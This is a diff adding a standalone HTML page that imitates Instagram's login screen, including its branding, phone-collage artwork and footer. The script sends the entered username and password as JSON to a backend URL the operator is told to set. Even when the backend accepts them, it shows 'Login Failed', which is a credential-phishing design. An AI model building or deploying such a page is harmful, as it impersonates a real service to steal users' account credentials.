@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>Login • Instagram</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --border: #dbdbdb;
+      --secondary: #8e8e8e;
+      --blue: #0095f6;
+      --blue-hover: #1877f2;
+      --facebook: #385185;
+      --text: #262626;
+      --input-bg: #fafafa;
+    }
+
+    body {
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
+
+      background: #fff;
+      color: var(--text);
+    }
+
+    .page {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 12px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 900px;
+
+      display: flex;
+      justify-content: center;
+      align-items: center;
+
+      gap: 40px;
+    }
+
+    /* =========================================
+       LEFT SIDE
+    ========================================= */
+
+    .left {
+      display: none;
+      width: 454px;
+      height: 600px;
+      position: relative;
+    }
+
+    .phone {
+      position: absolute;
+
+      width: 250px;
+      height: 540px;
+
+      border-radius: 24px;
+
+      background: white;
+
+      border: 1px solid rgba(0, 0, 0, 0.08);
+
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+
+      overflow: hidden;
+    }
+
+    .phone1 {
+      left: 0;
+      top: 40px;
+      transform: rotate(-6deg);
+    }
+
+    .phone2 {
+      left: 102px;
+      top: 0;
+      z-index: 2;
+    }
+
+    .phone3 {
+      left: 204px;
+      top: 46px;
+      transform: rotate(6deg);
+    }
+
+    /* Feed */
+
+    .feed-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+
+      padding: 12px;
+
+      border-bottom: 1px solid #efefef;
+    }
+
+    .feed-avatar {
+      width: 32px;
+      height: 32px;
+
+      border-radius: 50%;
+
+      background:
+        radial-gradient(
+          circle at 30% 70%,
+          #ffd600,
+          #ff7a00 55%,
+          #ff0069
+        );
+    }
+
+    .feed-lines {
+      flex: 1;
+    }
+
+    .feed-lines span {
+      display: block;
+
+      height: 7px;
+
+      border-radius: 4px;
+
+      background: #262626;
+
+      width: 70px;
+
+      margin-bottom: 6px;
+    }
+
+    .feed-lines span:last-child {
+      width: 45px;
+      background: #dcdcdc;
+      margin-bottom: 0;
+    }
+
+    .feed-photo {
+      width: 100%;
+      aspect-ratio: 1;
+
+      background:
+        radial-gradient(circle at 25% 25%, #ffd27d, transparent 60%),
+        radial-gradient(circle at 80% 80%, #ff5f6d, transparent 65%),
+        linear-gradient(135deg, #ffc371, #ff5f6d);
+    }
+
+    .feed-actions {
+      display: flex;
+      gap: 14px;
+
+      padding: 12px;
+
+      font-size: 20px;
+    }
+
+    /* Reels */
+
+    .reels {
+      height: 100%;
+
+      position: relative;
+
+      background:
+        radial-gradient(circle at 30% 20%, #7f5aff, transparent 55%),
+        radial-gradient(circle at 75% 75%, #ff2d78, transparent 60%),
+        linear-gradient(160deg, #2b1055, #7597de);
+    }
+
+    .reels-play {
+      position: absolute;
+      inset: 0;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      color: white;
+      font-size: 44px;
+    }
+
+    .reels-side {
+      position: absolute;
+
+      right: 12px;
+      bottom: 90px;
+
+      display: flex;
+      flex-direction: column;
+
+      gap: 18px;
+
+      color: white;
+
+      font-size: 22px;
+
+      text-align: center;
+    }
+
+    .reels-side small {
+      display: block;
+      font-size: 10px;
+      margin-top: 2px;
+    }
+
+    .reels-meta {
+      position: absolute;
+
+      left: 12px;
+      bottom: 16px;
+
+      color: white;
+
+      font-size: 11px;
+    }
+
+    /* Profile */
+
+    .profile {
+      padding: 24px 12px 16px;
+    }
+
+    .profile-top {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .profile-avatar {
+      width: 84px;
+      height: 84px;
+
+      border-radius: 50%;
+
+      padding: 3px;
+
+      background:
+        radial-gradient(
+          circle at 30% 70%,
+          #ffd600,
+          #ff7a00 55%,
+          #ff0069
+        );
+    }
+
+    .profile-avatar-inner {
+      width: 100%;
+      height: 100%;
+
+      border-radius: 50%;
+
+      border: 3px solid white;
+
+      background: linear-gradient(
+        135deg,
+        #b8c6ff,
+        #e0c3fc
+      );
+    }
+
+    .profile-name {
+      font-size: 15px;
+      margin-top: 10px;
+    }
+
+    .profile-username {
+      font-size: 12px;
+      color: var(--secondary);
+    }
+
+    .profile-stats {
+      display: flex;
+      justify-content: center;
+
+      gap: 26px;
+
+      padding: 14px 0;
+
+      font-size: 12px;
+
+      text-align: center;
+    }
+
+    .profile-stats strong {
+      display: block;
+      font-size: 14px;
+    }
+
+    .profile-grid {
+      display: grid;
+
+      grid-template-columns: repeat(3, 1fr);
+
+      gap: 2px;
+    }
+
+    .profile-grid div {
+      aspect-ratio: 1;
+    }
+
+    .profile-grid div:nth-child(3n + 1) {
+      background: linear-gradient(
+        135deg,
+        #a1c4fd,
+        #c2e9fb
+      );
+    }
+
+    .profile-grid div:nth-child(3n + 2) {
+      background: linear-gradient(
+        135deg,
+        #fbc2eb,
+        #a6c1ee
+      );
+    }
+
+    .profile-grid div:nth-child(3n) {
+      background: linear-gradient(
+        135deg,
+        #fddb92,
+        #d1fdff
+      );
+    }
+
+    /* =========================================
+       LOGIN COLUMN
+    ========================================= */
+
+    .login-column {
+      width: 350px;
+      max-width: 100%;
+    }
+
+    .login-card {
+      background: white;
+
+      border: 1px solid var(--border);
+
+      border-radius: 12px;
+
+      padding: 40px;
+
+      margin-bottom: 10px;
+    }
+
+    .logo {
+      text-align: center;
+
+      font-family:
+        "Segoe Script",
+        cursive;
+
+      font-size: 44px;
+
+      line-height: 1;
+
+      margin-bottom: 34px;
+
+      user-select: none;
+    }
+
+    /* =========================================
+       INPUTS
+    ========================================= */
+
+    .form {
+      display: flex;
+      flex-direction: column;
+
+      gap: 12px;
+    }
+
+    .field {
+      position: relative;
+
+      height: 44px;
+
+      background: var(--input-bg);
+
+      border: 1px solid var(--border);
+
+      border-radius: 6px;
+    }
+
+    .field:focus-within {
+      border-color: #a8a8a8;
+    }
+
+    .field input {
+      width: 100%;
+      height: 100%;
+
+      border: none;
+
+      background: transparent;
+
+      outline: none;
+
+      font-size: 14px;
+
+      color: var(--text);
+
+      padding: 20px 10px 7px;
+    }
+
+    .field input::placeholder {
+      color: transparent;
+    }
+
+    .field label {
+      position: absolute;
+
+      left: 10px;
+      top: 50%;
+
+      transform: translateY(-50%);
+
+      font-size: 14px;
+
+      color: var(--secondary);
+
+      pointer-events: none;
+
+      transition:
+        transform 0.12s ease,
+        top 0.12s ease;
+    }
+
+    .field input:focus + label,
+    .field input:not(:placeholder-shown) + label {
+      top: 8px;
+
+      transform:
+        translateY(0)
+        scale(0.72);
+    }
+
+    /* =========================================
+       PASSWORD
+    ========================================= */
+
+    .password-field input {
+      padding-right: 55px;
+    }
+
+    .show-password {
+      position: absolute;
+
+      right: 6px;
+      top: 50%;
+
+      transform: translateY(-50%);
+
+      border: none;
+
+      background: transparent;
+
+      font-size: 13px;
+
+      font-weight: 600;
+
+      color: var(--text);
+
+      cursor: pointer;
+
+      padding: 6px;
+    }
+
+    /* =========================================
+       LOGIN BUTTON
+    ========================================= */
+
+    .login-button {
+      margin-top: 4px;
+
+      height: 36px;
+
+      background: var(--blue);
+
+      color: white;
+
+      border: none;
+
+      border-radius: 8px;
+
+      font-size: 14px;
+
+      font-weight: 600;
+
+      cursor: pointer;
+
+      transition: background 0.15s;
+    }
+
+    .login-button:hover {
+      background: var(--blue-hover);
+    }
+
+    .login-button:disabled {
+      opacity: 0.3;
+
+      cursor: not-allowed;
+    }
+
+    /* =========================================
+       DIVIDER
+    ========================================= */
+
+    .divider {
+      display: flex;
+
+      align-items: center;
+
+      gap: 18px;
+
+      margin: 20px 0;
+
+      color: var(--secondary);
+
+      font-size: 13px;
+
+      font-weight: 600;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+
+      flex: 1;
+
+      height: 1px;
+
+      background: var(--border);
+    }
+
+    /* =========================================
+       FACEBOOK
+    ========================================= */
+
+    .facebook {
+      display: flex;
+
+      align-items: center;
+
+      justify-content: center;
+
+      gap: 8px;
+
+      color: var(--facebook);
+
+      font-size: 14px;
+
+      font-weight: 600;
+
+      text-decoration: none;
+
+      margin-bottom: 20px;
+    }
+
+    .facebook svg {
+      width: 18px;
+      height: 18px;
+
+      fill: var(--facebook);
+    }
+
+    /* =========================================
+       FORGOT PASSWORD
+    ========================================= */
+
+    .forgot {
+      display: block;
+
+      text-align: center;
+
+      color: #00376b;
+
+      font-size: 12px;
+
+      text-decoration: none;
+    }
+
+    /* =========================================
+       SIGNUP
+    ========================================= */
+
+    .signup-card {
+      background: white;
+
+      border: 1px solid var(--border);
+
+      border-radius: 12px;
+
+      padding: 20px;
+
+      text-align: center;
+
+      font-size: 14px;
+
+      margin-bottom: 18px;
+    }
+
+    .signup-card a {
+      color: var(--blue);
+
+      font-weight: 600;
+
+      text-decoration: none;
+    }
+
+    /* =========================================
+       GET APP
+    ========================================= */
+
+    .get-app {
+      text-align: center;
+
+      font-size: 14px;
+
+      margin-bottom: 16px;
+    }
+
+    .badges {
+      display: flex;
+
+      justify-content: center;
+
+      gap: 8px;
+    }
+
+    .badge {
+      height: 42px;
+
+      background: #000;
+
+      color: white;
+
+      border-radius: 8px;
+
+      display: flex;
+
+      align-items: center;
+
+      gap: 8px;
+
+      padding: 0 12px;
+
+      text-decoration: none;
+    }
+
+    .badge svg {
+      width: 20px;
+      height: 20px;
+    }
+
+    .badge small {
+      display: block;
+
+      font-size: 9px;
+
+      line-height: 1.1;
+    }
+
+    .badge strong {
+      display: block;
+
+      font-size: 13px;
+
+      line-height: 1.15;
+    }
+
+    /* =========================================
+       FOOTER
+    ========================================= */
+
+    footer {
+      padding: 24px 16px 32px;
+
+      text-align: center;
+    }
+
+    .footer-links {
+      display: flex;
+
+      flex-wrap: wrap;
+
+      justify-content: center;
+
+      gap: 8px 16px;
+
+      max-width: 700px;
+
+      margin: 0 auto 12px;
+    }
+
+    .footer-links a {
+      color: var(--secondary);
+
+      font-size: 12px;
+
+      text-decoration: none;
+    }
+
+    .copyright {
+      color: var(--secondary);
+
+      font-size: 12px;
+    }
+
+    /* =========================================
+       RESPONSIVE
+    ========================================= */
+
+    @media (min-width: 850px) {
+      .left {
+        display: block;
+      }
+    }
+
+    @media (max-width: 500px) {
+      .main {
+        padding: 20px 12px;
+      }
+
+      .login-card {
+        border: none;
+
+        padding: 30px 20px 20px;
+      }
+
+      .signup-card {
+        border: none;
+      }
+
+      .logo {
+        font-size: 40px;
+      }
+
+      .login-column {
+        width: 350px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="page">
+
+    <!-- =====================================
+         MAIN
+    ====================================== -->
+
+    <main class="main">
+
+      <div class="container">
+
+        <!-- =================================
+             LEFT PHONE COLLAGE
+        ================================== -->
+
+        <div class="left">
+
+          <!-- Phone 1 -->
+          <div class="phone phone1">
+
+            <div class="feed-header">
+
+              <div class="feed-avatar"></div>
+
+              <div class="feed-lines">
+                <span></span>
+                <span></span>
+              </div>
+
+            </div>
+
+            <div class="feed-photo"></div>
+
+            <div class="feed-actions">
+              ❤️
+              💬
+              ✈️
+              🔖
+            </div>
+
+          </div>
+
+          <!-- Phone 2 -->
+          <div class="phone phone2">
+
+            <div class="reels">
+
+              <div class="reels-play">
+                ▶
+              </div>
+
+              <div class="reels-side">
+                ❤️
+                <small>12.5K</small>
+
+                💬
+                <small>324</small>
+
+                ✈️
+
+              </div>
+
+              <div class="reels-meta">
+                @instagram
+              </div>
+
+            </div>
+
+          </div>
+
+          <!-- Phone 3 -->
+          <div class="phone phone3">
+
+            <div class="profile">
+
+              <div class="profile-top">
+
+                <div class="profile-avatar">
+                  <div class="profile-avatar-inner"></div>
+                </div>
+
+                <div class="profile-name">
+                  Instagram
+                </div>
+
+                <div class="profile-username">
+                  @instagram
+                </div>
+
+              </div>
+
+              <div class="profile-stats">
+
+                <div>
+                  <strong>12</strong>
+                  Posts
+                </div>
+
+                <div>
+                  <strong>1.2M</strong>
+                  Followers
+                </div>
+
+                <div>
+                  <strong>120</strong>
+                  Following
+                </div>
+
+              </div>
+
+              <div class="profile-grid">
+
+                <div></div>
+                <div></div>
+                <div></div>
+
+                <div></div>
+                <div></div>
+                <div></div>
+
+                <div></div>
+                <div></div>
+                <div></div>
+
+              </div>
+
+            </div>
+
+          </div>
+
+        </div>
+
+
+        <!-- =================================
+             LOGIN COLUMN
+        ================================== -->
+
+        <div class="login-column">
+
+          <!-- LOGIN CARD -->
+
+          <div class="login-card">
+
+            <div class="logo">
+              Instagram
+            </div>
+
+
+            <!-- LOGIN FORM -->
+
+            <form
+              class="form"
+              id="loginForm"
+              autocomplete="off"
+            >
+
+              <!-- USERNAME -->
+
+              <div class="field">
+
+                <input
+                  type="text"
+                  id="user"
+                  name="user"
+                  placeholder=" "
+                  required
+                />
+
+                <label for="user">
+                  Phone number, username, or email
+                </label>
+
+              </div>
+
+
+              <!-- PASSWORD -->
+
+              <div class="field password-field">
+
+                <input
+                  type="password"
+                  id="password"
+                  name="password"
+                  placeholder=" "
+                  minlength="4"
+                  required
+                />
+
+                <label for="password">
+                  Password
+                </label>
+
+                <button
+                  type="button"
+                  class="show-password"
+                  id="showPassword"
+                >
+                  Show
+                </button>
+
+              </div>
+
+
+              <!-- LOGIN BUTTON -->
+
+              <button
+                type="submit"
+                class="login-button"
+                id="loginButton"
+              >
+                Log in
+              </button>
+
+            </form>
+
+
+            <!-- DIVIDER -->
+
+            <div class="divider">
+              OR
+            </div>
+
+
+            <!-- FACEBOOK -->
+
+            <a
+              href="#"
+              class="facebook"
+              onclick="return false"
+            >
+
+              <svg
+                viewBox="0 0 24 24"
+              >
+
+                <path
+                  d="M22 12a10 10 0 1 0-11.56 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.5-3.89 3.78-3.89 1.09 0 2.23.2 2.23.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.45 2.89h-2.33v6.99A10 10 0 0 0 22 12z"
+                />
+
+              </svg>
+
+              Log in with Facebook
+
+            </a>
+
+
+            <!-- FORGOT PASSWORD -->
+
+            <a
+              href="#"
+              class="forgot"
+              onclick="return false"
+            >
+              Forgot password?
+            </a>
+
+          </div>
+
+
+          <!-- SIGNUP CARD -->
+
+          <div class="signup-card">
+
+            Don't have an account?
+
+            <a href="#">
+              Sign up
+            </a>
+
+          </div>
+
+
+          <!-- GET APP -->
+
+          <div class="get-app">
+            Get the app.
+          </div>
+
+
+          <div class="badges">
+
+            <!-- APP STORE -->
+
+            <a
+              href="#"
+              class="badge"
+              onclick="return false"
+            >
+
+              <svg
+                viewBox="0 0 24 24"
+                fill="white"
+              >
+
+                <path
+                  d="M17.05 12.54c-.03-2.89 2.36-4.28 2.47-4.35-1.35-1.97-3.44-2.24-4.18-2.27-1.78-.18-3.47 1.05-4.37 1.05-.9 0-2.29-1.02-3.77-1-1.94.03-3.73 1.13-4.72 2.86-2.02 3.5-.52 8.68 1.45 11.52.96 1.39 2.11 2.95 3.61 2.89 1.45-.06 2-.93 3.75-.93s2.24.93 3.77.9c1.56-.03 2.55-1.41 3.5-2.81 1.1-1.61 1.56-3.17 1.58-3.25-.03-.02-3.06-1.17-3.09-4.61zM14.16 4.06c.8-.97 1.34-2.32 1.19-3.66-1.15.05-2.55.77-3.38 1.74-.74.86-1.39 2.23-1.22 3.55 1.29.1 2.6-.65 3.41-1.63z"
+                />
+
+              </svg>
+
+              <span>
+                <small>Download on the</small>
+                <strong>App Store</strong>
+              </span>
+
+            </a>
+
+
+            <!-- GOOGLE PLAY -->
+
+            <a
+              href="#"
+              class="badge"
+              onclick="return false"
+            >
+
+              <svg
+                viewBox="0 0 24 24"
+              >
+
+                <path
+                  fill="#00d3ff"
+                  d="M3.6 1.8 13.7 12 3.6 22.2c-.4-.2-.6-.7-.6-1.2V3c0-.5.2-1 .6-1.2z"
+                />
+
+                <path
+                  fill="#00f076"
+                  d="M17.1 8.6 5.2 1.9c-.3-.2-.7-.2-1-.1l9.5 10.2 3.4-3.4z"
+                />
+
+                <path
+                  fill="#ffc900"
+                  d="M20.5 10.9l-3.4-2.3-3.4 3.4 3.4 3.4 3.4-2.3c1-.6 1-1.6 0-2.2z"
+                />
+
+                <path
+                  fill="#f43249"
+                  d="M4.2 22.2c.3.1.7.1 1-.1l11.9-6.7-3.4-3.4-9.5 10.2z"
+                />
+
+              </svg>
+
+              <span>
+                <small>GET IT ON</small>
+                <strong>Google Play</strong>
+              </span>
+
+            </a>
+
+          </div>
+
+        </div>
+
+      </div>
+
+    </main>
+
+
+    <!-- =====================================
+         FOOTER
+    ====================================== -->
+
+    <footer>
+
+      <div class="footer-links">
+
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+
+      </div>
+
+      <div class="copyright">
+        © 2026 Instagram from Meta
+      </div>
+
+    </footer>
+
+  </div>
+
+
+  <!-- =====================================
+       JAVASCRIPT
+  ====================================== -->
+
+  <script>
+
+    /* =====================================
+       PASSWORD SHOW / HIDE
+    ====================================== */
+
+    const passwordInput =
+      document.getElementById("password");
+
+    const showPasswordButton =
+      document.getElementById("showPassword");
+
+
+    showPasswordButton.addEventListener(
+      "click",
+      function () {
+
+        if (passwordInput.type === "password") {
+
+          passwordInput.type = "text";
+
+          showPasswordButton.textContent = "Hide";
+
+        } else {
+
+          passwordInput.type = "password";
+
+          showPasswordButton.textContent = "Show";
+
+        }
+
+      }
+    );
+
+
+    /* =====================================
+       LOGIN FORM
+    ====================================== */
+
+    const loginForm =
+      document.getElementById("loginForm");
+
+    const loginButton =
+      document.getElementById("loginButton");
+
+
+    loginForm.addEventListener(
+      "submit",
+      async function (event) {
+
+        event.preventDefault();
+
+
+        /*
+         * Get values from input fields
+         */
+
+        const user =
+          document.getElementById("user").value.trim();
+
+        const password =
+          document.getElementById("password").value;
+
+
+        /*
+         * Basic validation
+         */
+
+        if (!user || !password) {
+
+          alert("Please enter username and password.");
+
+          return;
+        }
+
+
+        /*
+         * Disable button while request is running
+         */
+
+        loginButton.disabled = true;
+
+        loginButton.textContent = "Logging in...";
+
+
+        try {
+
+          /*
+           * SEND DATA TO BACKEND
+           *
+           * Change this URL according
+           * to your backend.
+           */
+
+          const response = await fetch(
+            "http://localhost:5000/login",
+            {
+              method: "POST",
+
+              headers: {
+                "Content-Type": "application/json"
+              },
+
+              body: JSON.stringify({
+                user: user,
+                password: password
+              })
+            }
+          );
+
+
+          /*
+           * Convert backend response
+           * from JSON
+           */
+
+          const data =
+            await response.json();
+
+
+          console.log(
+            "Backend response:",
+            data
+          );
+
+
+          /*
+           * Check response
+           */
+
+          if (response.ok) {
+
+            alert(
+              "Login Failed"
+            );
+
+            /*
+             * Example:
+             *
+             * window.location.href = "/home.html";
+             */
+
+          } else {
+
+            alert(
+              
+              "Login failed."
+            );
+
+          }
+
+        } catch (error) {
+
+          console.error(
+            "Login error:",
+            error
+          );
+
+          alert(
+            "Cannot connect to the server."
+          );
+
+        } finally {
+
+          /*
+           * Enable button again
+           */
+
+          loginButton.disabled = false;
+
+          loginButton.textContent = "Log in";
+
+        }
+
+      }
+    );
+
+  </script>
+
+</body>
+
+</html>
